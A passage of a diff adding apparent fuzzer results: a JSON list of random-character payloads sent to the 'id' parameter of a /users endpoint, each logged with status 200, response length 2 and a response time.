+    "payload": "hFKf8d{;x^dTq*L}dNn())EBgum?Dp_0Qy*SABj!iH1H$WSI|?Fr?][J-?q#XgDc@3D68a%j|TPp$:>:leJW>]iwqCh6fV[oH+YUufslkeAB0:K^2_[Q;ZD;;GJJ]EyNIb!{V:,fX}@]tT@3?_U]#n@3*H!AtdeBT$9Aa;u*xBewh?wHsed)(wB|UwQTfh@NL>NFiKc8Pa*U!D9%)VUjSW*}l5#ae,mYWC@m-llOd6JP%yRIF4]AUup?49v(zqDv9O(b7c?N9oCQt4hKYa]EHbj_UMFp-+TSN(46Rn-LaNY8!KM]7#zupm.[zIaBQpf)9ElM]v0Dl=SW#Y_evZm9l.3_$@0.Z&tJk};}Xg,E7DtTRFKi%XDN,KdZi$ATK^Vc=iJ805Gu93@(s{gif|17:bQig@K_a7WQ}gik@Cq#J$l@$)]cZJ;C_-8+93,VL:_r7$#NvT!1,<>Yt}uKloB+11IuCY)l9HAm7[>0#*3CKhEm>w1I}hacB}[;wA#Ydd;!8ymj8>R8]^=<3#ssa-)C:;*gi8(*PAhUMS-N%!Tr+fb-+dVbMd(rR.d,>PAEgu*quw8^4^Xxm#HiYmN[WIU=Usn]ZAd8!}#sEgz%]OKBZ|FC9-SU,CG!MwU?bq;UjHKa]DMo*li3.D3n@F0oN[?sj6UD|*!?Edta{0}f+6=IacB%BFDz9%ZCR+WPcAWr1dy_Lb8+28v[",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.316577
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": ";UF(nB$EV@^;{_GdM,JB^1}ZEZyCdYM&h]{d<x^7sCX^G49j[t{Ka2|.sDV);fqQ;2IlJ^]J3s$l+acVA3hWAc]38K;+qEDMB7KJI)Eq3y;rU][V>6FD394d@+;*ia+?!z1yExLNkkU8RMAx%}eJF*La2}Uekg{rzCf|8idiAJ3F:BvS=hIAW?DrLDUOQ1[jy{n.Ik8[2Gojo,[dFtLz-xoEkHKLhJB;u6Y7=^Sa:?Bk&Yqh.-UAQ:Q0G1[]|65j&O*LAP%A19X|0K^q%57dFr(a[qPrGipyF>tD%sf$^XPRI2RH+HvK?:$V2n1gsM06!NO,Ng#I+_Gg^*G+V-VoIjMcc:ydY>Sc[m7NjM8KeI(s_x|;z5goh6>t.6b@LML%Xo{AIP?OPfx9(.:swvsNj69^$fnJh[qz|Awa[vdEb8X7teD9quN$^L)Pm3q(8c(2EeX5AkJw4sNR9,E8,R8r:TVJ,]up>zD^oFv#nW9WB:uWqQ>Hpx?%h+q)3BzVaBrk^s8Fm?(uy4Df(%CyR*zZ={4oiPq]f.jLNczNKogD))CJ#OiE3k^7=9N}B(gj.*0Q523l;>qyHXubl:Hn[zht]ToxVpR6yK7$2-!huW#FXhSVswN1&eye",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.310635
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "(OU@;Vf.4klI=U7PDd0_hfDU%QJR1o@K}aqj3ry;:qk7>cQEl4<bR|eUSt:r4;?^ItgIx+::DS!uMn8q0f>*8%=n61.kn@948W$+<vU&%|bHpJQZgh{q[!|2!8XlNJ3}IyGtO)j_tQQiW!]m!mL7sO}>-mae?(E(RGy]t*[ZRA!ZYf_&pwp(_omFiO_SB6UqIhD4-ubMb=.7{8^tEFk1yy4Xj&u,iv$DECGh3zaxUOvZq)BWi._q^Nn;30#h<**#%VXHKqH5D{e0!}w!j1&*P9Q>SXLm!G)E9QI5ApXEh5RBmaKr-ar{nId3_YQwMf[<MgL*Qj9:PESqf.M*c[*tx$8#HF3!)%AEqV{|ZJ(G-V63K,a5S>rEx6h.c8^,Za4bX^r{m[YA_zhZ#Ul)?Y,f_gQMdtGQysRQ*1.I#J#w0jU|o4+<]uN%pc!t3E;UWPT)8x[Ar{7NqKx?8:7D$47,?$@5,9o)6oZE=4R0LOAbLLBfnTvKx8oJZ;SC55n8&YntR|yS6@L,M^Pi*d6J]zx93S6b:Wrw39?dP$V8)ZB81Zv4&8u%%!a9o:dZ,r^5DHwUD;4h|l!![4-DgrQ4.6v(!jA1?dG<(!-3$_wtJ)E))A[:?K8_9e:;$Q!tnkR6(bI{$d{u<[?=ST+aM]o+[W0Z3)T0Y8tsJQYfWptw;kM2d.#QDYRMG$aS:i},q!BvPh<${>D(LoWvxKD].6F5&DQ&%0vc1{|vqGtp=pv}y994O:H2>2;XW,Chi&mBBpHg[Xkia:-[Rw;pt91HOlIUiT{ILp!w;|VCd:4d5%?x#OHsCOVU(tg<A?C",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.321269
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "u;F1?,f(pJ,OEZFrZgJ!!XHUfPRir)Y!KDIO@(hBbR?%^h*bp_;3v-:mt6sPm2wKx{atNztoNyq0j#QClo5Iv]c7dsV[jV&jpq-%x#4Rg7g.8H#4;|}vE$SJgU90=_+a{wC;Ki*}n%+$|CF5eKitc6-y;(fDhb?dHS!p#^wHAg,hS&8%2ueehj;P[^F})&{MDsuG[,ZGLNAsaa+]JuE0r-u#c%GSPSa?6&C5=G3fV0,>:9:R-?CVo-N@OX2c;:{[6j7ZPfcfeMA*f)KAN@Zzz&K:<jkrt:s%7AIBFY0G;}bzQ7!j}hPx|!4FgU:?>N1G4V_)b|;4MHHz71<h]cIOGQHm&z6}9C^%F#]0ncVKkNsPWExoeuz!yp;e)hE.POB]n-BY+4$YZr7KkGa,=S4JiQ*4LpZ)9:}}@Q&<A)%2^QUK?&HrURp;*1hN4b90F6RydE-NCr7A=jSJ{UH(A5p:t;@Puz9-w^$lSW#CmTHhGL1%=OsL,[0IbS)90lNoz@4bf7HP0Rzx<JO:|d!s,lu9e[sH1%y1SOv!C+N_T9D)OsS>:p;Ki4D6kGw+H-m)^M11GNy2bVw&o,V#7CPFA!2iMu0^Yvi?EIj0Uo{${(vE22ON-a=W7.=BRbSsH}?F)*G|3#+2qkzH6_w?O9%[7ca[Gz$J2+oEH}J>%5i}kIlo(3]]J*$2gCV;|;Y>efVW?_bzpPU?2st@&,k0S:=Zqg4xX{AEUV8GZTz@MJ)1YIYSkR#YPC*ax!QZO.r,mwl7qF[}GJ^)zr<TwaaVW(]VjX8:-L=qQ:hV@chs_VfC5VIZ9Z%_2>_PZk[d7LR$B_P_WcaByt]JG?x,#{y1-[ZBJ^#e3wfe1tMo+Ar4=J?B{Qx&?_[tEm59]RP^w2JZhGQ-Z4RH,R!Fa|UMRR",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.316876
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "h9odaqM,X=pCN$H6NGIjjE-T(63lDb2WltTYoLZa2D2SgT[0(vHc1J&$.sn@u^YOi(atiWD[C}K47S{8N2!^J%#_5N,yv?nK2y%wr8PY@pQ|?X&aeN$&6.Fuz",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.326183
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "7?l%@>U#{!Rv#*?rq^[rlMw*Uk%)O-1rv+w8}K[Q|&x6Oxv@RN}MLja.md8BCtb3Aii%aMk34ZkD+2yRs9<xoCS3:WXNSVz$FP:CtRW-BKu@GJ)UAvgJQU-NL#,!OY8%gZP^^4Ew2T{.i)4hZNXGei1trzP8gx]E7IKY?6Q((<Y=3c?wjegti@Mpod::IP93x:M9wQVY-,V7Co3GY8n4s#)Q#Yw+:O*7XLu72U}w3u9*kTp@rQ>a}@Fz(3ezc9o@@1{kUMo(9<iz&]jOrmQcn&+vmi)U^{^_c>fxPETHcG@#QMK&CCoHB,K5$5&X3%gX,snK^RCaMJVlt.nA}8orn^25F?s:mv<<hY[#dnX-<<>vBU@)MmR0Ed@S2WWQhSN9Ng>G-J^1F:S(V@MH5ir_Ti4<BBZ",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.131084
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "1w-MI!0tXC^h]AT!Sqq+P?qz3sn#Gf7hb)lFa-nwQD0TQ<[yYq|8Q.cLf*Tld(PL3%c-q{bg?hNWd&MUd}+kV:#dz44ocdJh3v|_-jke#",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.319742
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "J3:1ME{L}Sttk7h>?p.wg=YP0zu[#LcV9)DEPxu%iN?+,I=BLf]dP<e[|aD9%bbT*M(4tnJl:iCu[huB4W$[KioP*3|Y1_bysZ=siB[n;(tEm:KwFRvCkq&>1ZquP4p6mENpJ2_yWFF|$_G*LogqO)*D-60?pyPJ<!}*W1)<H%-B=I=h,fKPz3X,)-K$Cupk!iDj1aZ|coiKnL^W&37!}mj(S?ZySbOnyP:sT)^7|rI<$J{Iv6v2@C0v8d}v})VeWVUNHR.G:jIJ4)3TYCYw^215ozfb7AcSPSTj}T]}}6_Xekr5,qEve$l_t(=n_Juoc8]TxX5>oZyH$@=Pcbo=hvvl9VyY0HU&7;jJMm[^nzx.bduLKy{L-0Gfi8%+vZ&(T+m23.AUjYXz&#=glD6cz%2)HGIm3=XN!.NYnvx-:<XyR}$@YJ5V<6VYv%$tf:?^i=cMEHHcOK<_K2:4x;&{^tPbnl};Lev[Vn^}1rh]%bI(yF$(Fo8yY*&<7LjKh19=!-YqyOQuQXOWA&xby)da*Rr;vo}ygdN4X?v4F@M0YSJWwQDHdM>1l.F}ca_m.;J.Cn#o[o1Ajv!9tONSjNfN*xOql?IKZ09bja>ei8dmKH(Pb%a2h7c[^6%j,E1GR(_[|0|j?%!*Nmx@=NEkIx@KyF$0hYC7d88e[kGn<m=nKZ8z24oBU7<=Mr%]]Q$bBVQQBPf[VGSqv1hH_}6@b,jB871*3wWRK52hYaw1X",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.314617
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "fi@v}RCP?PUz?Zwre^pezk<u>G!@.Jjh,;L!Wx6J$E9NQ}+N(-tnW9NPq.V3qY;RtQ*cwR;;&kiDETM>]sryTZa4Q:UG?%-0XWe&r_148dlV12W6H52y]G%dI2Vn0c%=S3lx{acVUC=W:2|W)aTr=$TEj=}ASNJl%JQkDc]5:OG6x%P;[^+mWE}dmNTj0o)UX=)Jxf^1GYejN$r^(g8iRz2dgh*5D|HsGoe(s*531%#Pw-Ba<|?(g35zU[[FJ$mQlMefWHL^lbLd[$.(&x|Y)m)O-7aktdA#zi@_&UxU;rC$:O2t68!k-NlWAYs(F76<F6j}brUxUiPfD_zU#RR]wuNPS9h$u-)gGX@G[H2}0BaAZ])EbudT1iu!-fyVTz,<bubYc2{JG^Mpz)[rE.2@cmhLJ[wZVx7XwKW]L:CYyo{H?nYl?#{_mo-(J6=u]W94$&bnv<)F|GhmTz<:J*K^k7wgs8y<[sH-2R6H@J{rFu}D_=^1}M2SjGn1:H=S@<6AlNpB1[u>PL#PG.XG|n+Midkw]t^!J@))zY$?P4.w19Onj2o|h*N;A&+3X<1[L<Lm7Dx#v#{Ji2Lc;uLqB|.aL)p@Tib):s8#vdE=y7XvA,MEzQ[|M3n*Sl=:MB(]Rb0wmm|+N?e+_hdWZSaOk8SXLLcRH6ZFDj{jiF",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.320174
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "cYf<#t%I8e8$8MdWkoeK6_]E9BF++o3uAF)otY-a;tI6FQjrTN|dqHyLKg<|-",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.329777
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "p",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.318739
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "YI]Z&swE&z<o@dvTFD.Sn()A#E.Nc_.i46F6u!<H+u,pGm!+nq5*iG:X.GwZ(h3}:?%L+O5Cu_X_(vUs1ELI1@BhMm6+g0pKfYClJ^hR,B*vi9uV(c0[.J4i,z0(uyg-TVnLR*wgLV75&.#t_o_+c,AuUOyjY_Ak0)ydnjZIp)8e@k_ZdPo2%.n6]HyE!$J2C)h-tp3{]gik2!]2!Md^;eVlj!{T$E548}JDYVBLiC+}2IGSbKA4pemicxc5[TiR8v60zW:?uKW_2pS>@R:wR2d$]ce{zX)P[JC2zt$KmmY,WmurAs+[#Qt2*dg<.+O^UfS3fi-IC,@C8-ZkmH=aLpIG6z!p:Gg<{=>3mQ+BYKgj.E3Q>kxHhy.J]V_$YxnE[DL8]Ai*EP0kKqOWX7Y$2@Ecp?lQxK@RAbA}Fp;|(mZs*:_cA:Uf)W:0!U_,j$&w^S%%5EMTrZ4)>8rB[_@oX3Ru$*d>0tbT4q8f*GN[qiIE7kW#|VM>hJ_I>>Vr:Fbswh9F8wI#@*[Z@2Zm:7FntW.j;F|ZwNd>=xtqqIL[!qb:{kNx$e:i3v%3qNh<<.[=&M-]<80Y5?8rA_w_da<hMb8=?:cX]gBTvIL0N%4{sF[ryM?6r7N[R;&$voU{?9hq&+4PjvJwo4BOw>!:I(ltCxoa)Hjzabo?AU&A!:t>t12qYUgu1h*O:0YCJ$z^4[b%Uiu>5aSUEt5@G^-2axirku2LS,9YsW<NUr(ZuPCzL;X%j(C+1l:4#D2pc,yxJPaxTH>4idw;C5@YPEV1?3tQyV{58-$?ncQcgXvCz3(PLGa%kPx_",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.318279
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "p.ByCB9r4;xcOC;H9c^vc](;E",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.322192
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "3MkeedS*$a|@rhh;m<DXgucS]F};nX:KW:nNT}[ji=G=Pij*dza>#$L!gAGRFP6x5wePqjky>g,K6UUc3y9[.7O&x4}Nwy:daUuKmQ]C::H?HtYv8^W#q:>3vlgb^AtpRi3*DK+<)@-f]J&G-{I^l)gFtEq<r^_[I]ca|B&b7E<omk+[;2Wi}=T[-^%7D!o9rD&?j<=wb#S|cDhX?YwcN_I*zj4vv,GEn{_o][IAlseG#XB94&V5F?^YzIXAw)#r380o-&]ydk{z=!Re+|o6hy3{l&|b#QVdZ((bxQI90puh=efBKR>u5uxuLcyU2YD*CDUcyM6&JW5T%KIg=dve_i0Y2$4EaG$8,AP>W%VwGwq=kEt?e(_yCga}=v*nS>qFarTR0H{0iY[VB",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.320839
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "|*yZ1Izb!sS=4k8*S>ad>dzA>^z#3rN&4mZu@aV_1o5T^4bz.J4=@e@]sz_lmzl(s4]zfV^R8{NLw80c6M:lZ};|k>,.Kimi)5-LO0PTy3CDWF38yH1Edz8bx3t8R@i;*loBE$(R[MxKH5,*$H|*l2)1a+4*9qmXCI1JVskZuZhxk*|I=vabj2y+N![c0=6;Q!B:SFL&h?0^zRU;jyU>DVnv6M}Z}Gbv@yDg8;9IRP]Q1!IH}Lpv8Yzn8fl?tr:]%W+pua2Z)M#,rr^B{}m+L&|76vRc#Fc#(j1tZZ=idRkCT#oa9-9=Y6W^nbo=*[5+1dV1L0s9ad<(79P-5Nv_.<gCJ2o:<6LHeqpkSR%^h2G{Dpg1z[p<0a9C^]PhGwE$jpAls^>CA%<Pwck!i<d3=rgn>bxa)Yps&n2bs<yN:j}**@MV5HZH40S}?|-}10zLX,$@O=R(M}jm3a.Zd9w,ZBGaca=KQtzAxh=LPAq|D7nxYFdb32,*JqCRI;72v&b3W:p,1OOiJ^g(b]Ez(lx2TsCunUD3:Ky7DV-;<5@}0WgOE=x;D[QUqbxL^9DE-nmQH%ki;^Cq*!uWM;JLw;G,Gy}DPpIf$y+i.OLb(?@ap,K_u1[M$&K26celGcGWry)}fj$=vIh5X6=u",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.130787
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": ".MiI!-5;7?-]}mNWKu)pUm;V[%9yZH<d@<Bq{-CrgEl:G@9=id=nnp89Ob[],sk>lC,=!x(o*e|^}$Sj<P3NMs79m8!6tsIfJ-e7%x.exiHjAg-k{MJ3hSCQJ6M>bpu)sxT8o(]g|233c1o4.A6H2jy2>|zSV%0?[vb1V_OKNTn|6]S;%[=9F7XEj|rK?s+!8R7:T$<EFAD:Ip6r+V=7iur1NMCr[I%OxANH.5ef|D)oCL0dH[115Yz,O@V0k>-Tv:?D{7_z0@(p_:caR7W]fsl_p=NzoOogYqnAuL2)#4R(&|&cFtbbpc.<S?sw%-J#|?_E#.06|=IlbL(r9vAwnYGykVr6Vig@5{kRNpldXxFy]#U][:c:{PwP;G_zuO:_dFVzJ5PW(;DLT#:9aH%4a|2$WtM+0eBMbFQzy#nG^H{8o3UetB54)hkrfdFg8St:7(rZUM9fzv#:{jusuRs2n_WphU@4@UgAC2ylD-eoyj7e4ayopIvMH)4sSuX86P}ntzcY9ct[n(uPDm9utkkFP?zU5bPIfzxILzW].D;*wQ(uZ)7k4!f#:vL#l!BTj9X(aYAz@+Gk->@9PNazJq98YM|%FX2e3TZ]5o|:hlOS5+fyowcO=xWnRdHx=f&$Q?CDbmZ2V;ko6y?r_73xjC@[^]7Z?Z&Y0f,wl3D%{@u&V<6|7&K48ObsFDE|TydYd-O0J!RnsV.:G^3u**2&tvLnOoDkg%T0jS2o[avw%=gZJrGl5>[_-=,6*GdBb)ddfk:-R*$UJ[|+NfwhHY;U4w_JSOu<a>{T6.03C71e;k3d0XASLezO&_1*N.|Bi*W?Q",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.323491
+  },
+  {
+    "type": "parameter",
+    "endpoint": "/users",
+    "parameter": "id",
+    "payload": "tNO+WX)mw8f:t4,^)M#O6pUEzT%5+DKrPnTDa#%1qJAt(5X(a4x)z.*e^<zs}LhJq{O!?nL@1(,I{S+Aok@q{2Q!(yy8!7H@vRnnlp{Y+7uvZWqKY&@t-LVeCbSesJc+BDES2LBb<ELcovDt0#)r.^Q+UR+T8,bMjsCn82*gUA3VkJ_twy!OnMlR04<W]w_i+fp^r*aR{fpC3q5mV)XY%F-(PZRS-]$@86aww%&LT(3I&]oU}&b4NrFl+ralWw&ywDr;fqx:fQiSv{=teNBqW8hN)mDcY2AAbm].}dtI#;a!E-)=x4IT?s)|v[kSqW)I$7%g>VnF)8ia1YoF7w}DScl96pxXs2)W[JbYILJfF?Vsae=4XycE;1^-Ucs4Im%td_[=QVht*}_:1|]lWJ+m^VA^U1JA99CrfEp5HmZF|ov|t23>6VSq!LBKfBFe6WR4EysNS5XTB]cjw&]nE85ekknEZco0>&gV6{wmQF=H[74LvM]S3=b);RD05ZI=[,V(6=(3Z[mgGUC#0$;kNK?7br2{*p!kdDPB2cQT@NqoGls:y2{1cL]h0].?HMq-fxnOW6TI&>m#r3<-&6-,H,$TXi^pWT%I5b7lE[]s%m56Z&EGa],PU{ei12jTD)mspBsD;-IDtd]*A2;XrFPriI64jT|<,.TvaBCEwcf[|eT$)<JQkxr1{MDmZe1;P}xd%oO$1r#YTyuEg$7?wA$G7<&%;E5fc:1r+E?8N);_B>=<@_4X@G%5Mi!>TcDN+gqKbK#4GThr=C^|t?^Fi$7EN#DZayR{zIMcR-bV+*4NvG[s*(zvFqrE!9y}0S>S6AGlFY|mkYtj.[]#k!H",
+    "status_code": 200,
+    "response_length": 2,
+    "response_time": 0.133502
+  }
+]
